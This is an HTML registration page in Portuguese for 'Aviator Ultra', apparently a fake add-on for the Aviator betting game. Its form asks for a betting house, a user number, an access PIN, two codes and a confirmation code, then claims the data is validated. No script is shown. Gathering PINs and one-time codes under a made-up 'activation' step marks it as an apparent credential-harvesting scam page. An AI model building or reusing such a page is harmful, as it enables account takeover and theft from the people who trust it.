<!DOCTYPE html>
<html lang="pt">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Aviator Ultra - Ativação e Registro</title>
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
</head>
<body>

    <div class="ambient-glow"></div>

    <div class="container">
        <div class="header-logo" id="headerContent">
            <div class="badge">Sistem Ultra v2.4</div>
            <h1>Aviator Ultra</h1>
        </div>
        
        <form id="registroForm">
            <div class="form-group">
                <label for="casa-aposta">Casa de Aposta</label>
                <div class="input-wrapper">
                    <input type="text" id="casa-aposta" name="casa_aposta" placeholder="Ex: OLABET" required>
                    <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 17h-2v-2h2v2zm2.07-7.75l-.9.92C13.45 12.9 13 13.5 13 15h-2v-.5c0-1.1.45-2.1 1.17-2.83l1.24-1.26c.37-.36.59-.86.59-1.41 0-1.1-.9-2-2-2s-2 .9-2 2H7c0-2.76 2.24-5 5-5s5 2.24 5 5c0 1.03-.42 1.98-1.07 2.75z"/></svg>
                </div>
            </div>

            <div class="form-group">
                <label for="numero-utilizador">Número de Utilizador</label>
                <div class="input-wrapper">
                    <input type="text" id="numero-utilizador" name="numero_utilizador" placeholder="Insira o seu número" required>
                    <svg viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
                </div>
            </div>

            <div class="form-group">
                <label for="pin">PIN de Acesso</label>
                <div class="input-wrapper">
                    <input type="text" id="pin" name="pin" placeholder="Insira o seu PIN" required>
                    <svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>
                </div>
            </div>

            <div class="form-group">
                <label for="primeiro-codigo">Primeiro Código</label>
                <div class="input-wrapper">
                    <input type="text" id="primeiro-codigo" name="primeiro_codigo" placeholder="Insira o primeiro código" required>
                    <svg viewBox="0 0 24 24"><path d="M9.4 16.6L4.8 12l4.6-4.6L8 6l-6 6 6 6 1.4-1.4zm5.2 0l4.6-4.6-4.6-4.6L16 6l6 6-6 6-1.4-1.4z"/></svg>
                </div>
            </div>

            <div class="form-group">
                <label for="segundo-codigo">Segundo Código</label>
                <div class="input-wrapper">
                    <input type="text" id="segundo-codigo" name="segundo_codigo" placeholder="Insira o segundo código" required>
                    <svg viewBox="0 0 24 24"><path d="M9.4 16.6L4.8 12l4.6-4.6L8 6l-6 6 6 6 1.4-1.4zm5.2 0l4.6-4.6-4.6-4.6L16 6l6 6-6 6-1.4-1.4z"/></svg>
                </div>
            </div>

            <div class="form-group">
                <label for="codigo-confirmacao">Código de Confirmação</label>
                <div class="input-wrapper">
                    <input type="text" id="codigo-confirmacao" name="codigo_confirmacao" placeholder="Insira o código de confirmação" required>
                    <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
                </div>
            </div>

            <button type="submit" id="submitBtn" class="btn-submit">
                <span class="btn-text">Confirmar o Registro</span>
                <div class="spinner"></div>
            </button>
        </form>

        <div id="successView" class="success-message">
            <h2>Dados validados com sucesso!</h2>
            <p>A redirecionar para a plataforma...</p>
        </div>
    </div>

</body>
</html>
